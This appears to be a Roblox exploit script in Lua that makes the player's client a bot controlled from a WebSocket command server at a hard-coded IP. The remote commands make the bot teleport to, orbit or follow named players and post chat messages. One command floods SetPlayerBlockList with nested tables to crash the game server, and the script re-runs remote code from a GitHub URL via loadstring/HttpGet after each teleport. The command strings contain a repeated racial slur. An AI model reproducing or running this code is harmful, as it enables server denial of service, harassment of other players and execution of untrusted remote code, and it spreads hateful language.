setfpscap(7)
game:GetService("RunService"):Set3dRenderingEnabled(false)
wait()
queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/lol-312/printhewwoworld/main/123",true))()]])
wait()
for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
   v:Disable()
end
local ws = WebSocket.connect("ws://109.71.252.155:8080")
ws:Send("connect:"..game.Players.LocalPlayer.Name)
local RunService = game:GetService("RunService")
game:GetService("RunService").Heartbeat:Connect(function()
  if game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit then
        game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Sit = false
    end
end)
for i,v in ipairs(game.workspace:GetDescendants()) do
    if v.ClassName == "Seat" then v:Destroy() end
end
local id = nil

ws.OnMessage:Connect(function(msg)
    print(msg)
    if msg:find("connectedwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone") then
        print("(+) Connected to websocket with id: "..msg:split(":")[2])
        id = tonumber(msg:split(":")[2])
   elseif msg:find("line_upwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone") then
    local parts = msg:split(" ")
    local targetName = parts[#parts]:lower()
    for i, v in pairs(game.Players:GetPlayers()) do
        if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
            targetName = v
            break
        end
    end

    if type(targetName) == "string" then return end
    local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
    print(targetName.Name)
    hrp.CFrame = targetName.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(id * 3, 0, 2))
    elseif msg:find("sendingmessageservicewefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone") then
             game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(tostring(msg:split(":")[2]),"All")
    elseif msg:find("killwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone") then
                  game.Players.LocalPlayer.Character.Humanoid.Health = -10191
    elseif msg:find('speedwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then 
                     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = msg:split(":")[3]
                       elseif msg:find('movetowefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then 
                       local parts = msg:split(" ")
        local targetName = parts[#parts]:lower()
            for i,v in pairs(game.Players:GetPlayers()) do
                if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
                    targetName = v
                    break
                end
            end
            
            if type(targetName) == "string" then return end
            game.Players.LocalPlayer.Character.Humanoid:MoveTo(targetName.Character.HumanoidRootPart.CFrame.Position)

                elseif msg:find('Rejoinwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then 
              game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer)
                elseif msg:find('netlagnwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then
               local parts = msg:split(" ")
        local targetName = parts[#parts]:lower()
            for i,v in pairs(game.Players:GetPlayers()) do
                if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
                    targetName = v
                    break
                end
            end
            
            if type(targetName) == "string" then return end
            local op = targetName.Name
            print(op)
            game:GetService('RunService').Heartbeat:connect(function()
   for i, v in pairs(workspace[op]:GetDescendants()) do
           if v:IsA("BasePart") then
               sethiddenproperty(v, "NetworkIsSleeping", true)
        end
   end
   
end)
elseif msg:find('jumpwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then
  game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
elseif msg:find('crashthefuckingserveralreadynwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then
  shared.TeleportToSky = false -- for games that show ur ping (like custom duels)

if shared.TeleportToSky then
local char = game:GetService('Players').LocalPlayer.Character
char.HumanoidRootPart.CFrame = CFrame.new(0,9e9,0)
task.wait(0.5)
char.HumanoidRootPart.Anchored = true
end
while wait(1.5) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
 
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
 
table.insert(spammedtable, {})
z = spammedtable[1]
 
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
 
local calculatemax = getmaxvalue(tableincrease)
local maximum
 
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
 
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
 
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
 
bomb(289, 5) --// change values if client crashes
end
elseif msg:find('mbodyguardamazinguckingstartniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then
if id == 1 then
      local parts = msg:split(" ")
    local targetName = parts[#parts]:lower()
    for i, v in pairs(game.Players:GetPlayers()) do
        if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
            targetName = v
            break
        end
    end

    if type(targetName) == "string" then return end
    _G.bro = true
    while _G.bro do
         pcall(function()
  game.Players.LocalPlayer.Character.Humanoid:MoveTo(targetName.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(5, 0, -0.7)).Position)
    wait()
  end)
  end
  elseif id == 2 then
        local parts = msg:split(" ")
    local targetName = parts[#parts]:lower()
    for i, v in pairs(game.Players:GetPlayers()) do
        if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
            targetName = v
            break
        end
    end

    if type(targetName) == "string" then return end
        _G.bro = true
    while _G.bro do
         pcall(function()
   game.Players.LocalPlayer.Character.Humanoid:MoveTo(targetName.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(-5, 0, -0.7)).Position)
     wait()
     end)
  end
  
  elseif id == 3 then
        local parts = msg:split(" ")
    local targetName = parts[#parts]:lower()
    for i, v in pairs(game.Players:GetPlayers()) do
        if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
            targetName = v
            break
        end
    end

    if type(targetName) == "string" then return end
            _G.bro = true
    while _G.bro do
         pcall(function()
   game.Players.LocalPlayer.Character.Humanoid:MoveTo(targetName.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(7, 0, -0.7)).Position)
     wait()
        end)
  end
  elseif id == 4 then
        local parts = msg:split(" ")
    local targetName = parts[#parts]:lower()
    for i, v in pairs(game.Players:GetPlayers()) do
        if v.Name:lower():match(targetName:lower()) or v.DisplayName:lower():match(targetName:lower()) then
            targetName = v
            break
        end
    end

    if type(targetName) == "string" then return end
                _G.bro = true
    while _G.bro do
         pcall(function()
   game.Players.LocalPlayer.Character.Humanoid:MoveTo(targetName.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(-7, 0, -0.7)).Position)
   wait()
           end)
  end
  end
elseif msg:find('mbodyguardamazinstopguckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdone') then
  _G.bro = false
  _G.bro = nil
elseif msg:find('orbitwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdonestart') then
  print("(+) Starting orbit")
        local parts = msg:split(" ")
        local targetName = parts[4]:lower()
        for i, v in pairs(game.Players:GetPlayers()) do
            if v.Name:lower():match(targetName) or v.DisplayName:lower():match(targetName) then
                targetName = v
                break
            end
        end

        if type(targetName) == "string" then
            print(targetName)
            print("(!) Invalid targetName")
            return
        end
         targetPlayer = targetName
         speed = tonumber(parts[5])
         distance = tonumber(parts[6])
local runService = game:GetService('RunService')
        local localPlayer = game.Players.LocalPlayer
        local localRoot = localPlayer.Character.HumanoidRootPart
        local targetRoot = targetPlayer.Character.HumanoidRootPart

        local spinTime = 0

        isOrbiting = true -- Start the orbit loop

        local spinCn = runService.Heartbeat:Connect(function(deltaTime)
            if not isOrbiting then
                return
            end

            spinTime = spinTime + deltaTime * speed

            local targetPos = targetRoot.Position
if targetPlayer.Character.Humanoid.Health <= 0 then
    spinCn:Disconnect()
    spinCn:Destroy()
    targetPlayer = nil
            targetPlayer:Disconnect()
            spinCn = nil
            speed = nil -- Set to your desired initial speed value
    distance = nil -- Set to your desired initial distance value
        isOrbiting = false -- Stop the orbit loop
end
            local xOffset = math.sin(spinTime) * distance
            local zOffset = math.cos(spinTime) * distance
            localRoot.CFrame = CFrame.new(targetPos + Vector3.new(xOffset, 0, zOffset), targetPos)
        end)
 elseif msg:find('aimodeisstartedtwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdonestop') then
    _G.Active = true
            while _G.Active do
                pcall(function()
                local Destination=game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position+Vector3.new(math.random(-500000, 500000) / 10000,0.0000000,math.random(-500000, 500000) / 10000)
                local path = game:GetService("PathfindingService"):CreatePath()
                path:ComputeAsync(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, Destination)
                for i,waypoint in pairs(path:GetWaypoints()) do
                    if waypoint.Action == Enum.PathWaypointAction.Jump then
                            game:GetService("Players").LocalPlayer.Character.Humanoid.Jump=true
                    end
                    game:GetService("Players").LocalPlayer.Character.Humanoid:MoveTo(waypoint.Position)
                    wait(math.random(35, 73) / 205)
                end
                for i=1, math.random(20000, 40000) / 10000 do
                    if _G.Active == true then
                        game:GetService("Players").LocalPlayer.Character.Humanoid.Jump=true
                        wait(math.random(50000, 100000) / 100000)
                    end
                end
                end)
            end
 elseif msg:find('aimodeisstartedtwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdonestopstop') then
 _G.Active = false
  _G.Active = nil
    elseif msg:find('orbitwefuckingniggersitneedsforantihashidkhowucanunhashitbcsoopowerfulllllyesiknowitishashingsystemitisusingsomewordsandmakinglolololololezezezuoajisyhfmdonestop') then
        print("(+) Stopping orbit")
    speed = nil -- Set to your desired initial speed value
    distance = nil -- Set to your desired initial distance value
    targetPlayer = nil
        isOrbiting = false -- Stop the orbit loop

        if spinCn then
            spinCn:Disconnect()
            spinCn = nil
        end

        print("(+) Orbit stopped")


    end
end)
wait()
game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
   if child.Name == "ErrorPrompt" then
  game:GetService("TeleportService"):Teleport(game.PlaceId, game.JobId, game.Players.LocalPlayer)
   while true do wait(5)
game:GetService("TeleportService"):Teleport(game.PlaceId, game.JobId, game.Players.LocalPlayer)
       end
   end
end)
wait()
if not game:IsLoaded() then
	game.IsLoaded:Wait()
end;
game:GetService("RunService").Heartbeat:Connect(function()
    for _,x in next, game:GetService("Players"):GetPlayers() do
        if x and x ~= game:GetService("Players").LocalPlayer and x.Character then
                for _,v in next, x.Character:GetChildren() do
                    if v:IsA("BasePart") and v.CanCollide then
                        v.CanCollide = false
                        if v.Name == "Torso" then
                            v.Massless = true
                        end
                        v.Velocity = Vector3.new()
                        v.RotVelocity = Vector3.new()
                    end
                end
        end
    end
end)
local RunService = game.RunService
local SpeedWaitBind = Instance.new("BindableEvent")
for _, v in ipairs({RunService.RenderStepped, RunService.Heartbeat, RunService.Stepped, RunService.PreRender, RunService.PostSimulation, RunService.PreSimulation}) do
    v.Connect(v, function()
        return SpeedWaitBind.Fire(SpeedWaitBind, tick())
    end)
end

local FastWait = function(Number)
    if not type(Number) == "number" then
        return
    else
        if Number == 0 or Number == "" or Number == " " then
            Number = 0
            SpeedWaitBind.Event:Wait(Number)
        else
            SpeedWaitBind.Event:Wait(number)
        end
    end
end

local Players = game:service("Players")
local LocalPlayer = Players.LocalPlayer

if not LocalPlayer.Character then
	repeat FastWait() until LocalPlayer.Character
end;

if not LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
	repeat FastWait() until LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
end;

local CheckInstance = function(Part)
	if Part.ClassName:lower():find("part") then
		local BaseInstance = Part;
		pcall(function()
			for i, Part in pairs(LocalPlayer.Character:GetDescendants()) do
				if Part.ClassName:lower():find("part") then
					local NoCollisionConstraint = Instance.new("NoCollisionConstraint", BaseInstance)
					NoCollisionConstraint.Enabled = true
					NoCollisionConstraint.Part0 = BaseInstance;
					NoCollisionConstraint.Part1 = Part;
				end
			end
		end)
	end
end;

local Insert = function(Target, Bool)
	local Start = function()
		local Inserted = {}
		if not Target.Character then
			Target.CharacterAdded:Wait()
		end;
		if not Target.Character:FindFirstChildOfClass("Humanoid") then
			repeat FastWait() until Target.Character:FindFirstChildOfClass("Humanoid")
		end;
		spawn(function()
			pcall(function()
				for i, v in pairs(Target.Character:GetDescendants()) do
					if v:IsA("NoCollisionConstraint") then
						v:Destroy()
					end
				end;
				for i, v in pairs(Target.Character:GetDescendants()) do
					CheckInstance(v)
				end;
				Target.Character.DescendantAdded:Connect(function(v)
					if not table.find(Inserted, v) then
						table.insert(Inserted, v)
						CheckInstance(v)
					end
				end)
			end)
		end)
	end;
	pcall(Start)
	if not Bool then
		Target.CharacterAdded:Connect(Start)
	end
end;

for i, v in pairs(Players:GetPlayers()) do
	if v ~= LocalPlayer then
		Insert(v, false)
	end
end;

Players.PlayerAdded:Connect(Insert, false)

local Reset = function()
	if not LocalPlayer.Character then
		LocalPlayer.CharacterAdded:Wait()
	end;
	if not LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
		repeat FastWait() until LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	end;
	for i, v in pairs(Players:GetPlayers()) do
		if v ~= LocalPlayer then
			pcall(function()
				for i, v in pairs(v.Character:GetDescendants()) do
					if v.IsA(v, "NoCollisionConstraint") then
						v:Destroy()
					end
				end
			end)
			Insert(v, true)
		end
	end
end;

LocalPlayer.CharacterAdded:Connect(Reset)
